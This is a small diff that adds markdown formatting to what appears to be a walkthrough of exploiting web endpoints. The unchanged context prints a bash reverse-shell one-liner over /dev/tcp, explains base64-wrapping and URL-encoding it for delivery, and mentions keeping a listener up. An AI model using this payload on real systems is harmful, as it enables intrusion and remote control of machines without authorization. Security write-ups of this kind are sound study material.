@@ -101,11 +101,11 @@ most of these endpoints have nothing, or are locked behind authentication or aut
 > > ```sh
 > > bash -c 'sh -i >& /dev/tcp/$IP/$PORT 0>&1'
 > > ```
-> > so in total it just wraps it in a base64 decode pipe:
+> > - so in total it just wraps it in a base64 decode pipe:
 > > ```sh
 > > echo "$base64payload" | base64 -d
 > > ```
-> > and the whole thing is urlencoded
+> > - and the whole thing is urlencoded
 > 
 > make sure to have a listener up to catch the revshell
 
